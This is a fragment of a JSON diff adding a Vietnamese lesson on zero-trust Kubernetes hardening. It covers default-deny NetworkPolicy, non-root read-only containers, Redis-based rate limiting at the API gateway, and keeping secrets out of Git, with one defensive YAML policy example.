+      "lesson_markdown": "## 1. Mô hình Tư duy & Bài toán Thực tế\n\nTrong mô hình bảo mật hạ tầng cũ (Perimeter Security), chỉ cần vượt qua tường lửa bên ngoài là kẻ tấn công có thể di chuyển ngang (Lateral Movement) tới mọi dịch vụ và cơ sở dữ liệu bên trong. Kiến trúc hiện đại áp dụng nguyên tắc **Zero-Trust & Đặc quyền Tối thiểu (Least Privilege)**: mọi dịch vụ mặc định bị từ chối kết nối mạng ngang, container chạy không quyền root với hệ thống tệp chỉ đọc, khóa bí mật được quản lý tách biệt khỏi Git, và API Gateway chặn đứng tấn công lạm dụng tài nguyên ngay tại biên.\n\n## 2. Cơ chế Hoạt động Tầng sâu\n\n- **Kubernetes `NetworkPolicy` (Default-Deny + Allowlist):** Mặc định mọi Pod trong cụm K8s nói chuyện được với nhau. Áp dụng chính sách `default-deny-all` trước, sau đó chỉ mở đúng các luồng hợp lệ (ví dụ: `assessment-grader-service` chỉ được kết nối tới `postgres:5432`, `redis:6379`, `content-kg-service:8002` và DNS `53`, tuyệt đối không được ra Internet công cộng).\n- **Container Hardening (`securityContext`):** Khóa cứng `runAsNonRoot: true`, `readOnlyRootFilesystem: true`, `allowPrivilegeEscalation: false` và `capabilities.drop: [\"ALL\"]` để cô lập tuyệt đối các Worker nguy hiểm như Code Sandbox.\n- **Rate Limiting tại API Gateway (Token Bucket / Sliding Window):** Bảo vệ các endpoint tốn tài nguyên (Đăng nhập, Chấm Code Sandbox, Suy luận RL) khỏi tấn công Brute-force và DoS bằng bộ đếm phân tán trên Redis.\n\n## 3. Ví dụ Mã nguồn Thực chiến\n\n```yaml\n# Kubernetes NetworkPolicy: Chỉ cho phép API Gateway gọi vào assessment-grader-service\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: allow-gateway-to-assessment\nspec:\n  podSelector:\n    matchLabels: { app: assessment-grader-service }\n  policyTypes: [Ingress, Egress]\n  ingress:\n    - from:\n        - podSelector: { matchLabels: { app: api-gateway } }\n      ports: [{ protocol: TCP, port: 8003 }]\n  egress:\n    - to: [{ podSelector: { matchLabels: { app: content-kg-service } } }]\n      ports: [{ protocol: TCP, port: 8002 }]\n    - ports:\n        - { protocol: UDP, port: 53 }\n        - { protocol: TCP, port: 53 }\n```\n\n## 4. Các Sự cố & Bẫy Phổ biến\n\n- **Commit tệp `.env` hoặc Kubernetes Secret Base64 vào Git:** Mã hóa Base64 trong K8s Secret **không phải là mã hóa bảo mật**, bất kỳ ai đọc được repo đều giải mã ngay tức thì. Phải dùng External Secrets Operator / HashiCorp Vault hoặc Sealed Secrets.\n- **Quên cấp `tmpfs` cho `/tmp` khi bật `readOnlyRootFilesystem: true`:** Nhiều ứng dụng Python/Node cần ghi file tạm vào `/tmp`; nếu bật chỉ đọc mà không gắn `emptyDir` giới hạn dung lượng cho `/tmp`, dịch vụ sẽ lỗi khi khởi động.\n\n## 5. Bảng Đánh đổi Kiến trúc\n\n| Lớp Bảo vệ Hạ tầng | Rủi ro được triệt tiêu | Đánh đổi vận hành |\n| --- | --- | --- |\n| **`NetworkPolicy` Default-Deny** | Chặn di chuyển ngang (Lateral Movement) và rò rỉ dữ liệu ra ngoài | Yêu cầu CNI hỗ trợ (Calico/Cilium) và phải khai báo rõ mọi luồng kể cả DNS 53 |\n| **`readOnlyRootFilesystem` + Non-Root** | Ngăn kẻ tấn công ghi mã độc hoặc leo thang đặc quyền trong container | Phải tách rõ thư mục tạm (`emptyDir`) và không cho phép ghi log xuống đĩa cục bộ |\n| **Rate Limit bằng Redis tập trung** | Giới hạn chính xác trên toàn cụm nhiều Gateway replicas | Thêm ~1ms độ trễ truy vấn Redis (cần cơ chế fail-open/local fallback khi Redis down) |",
+      "is_shared": true
     }
   ]
 }
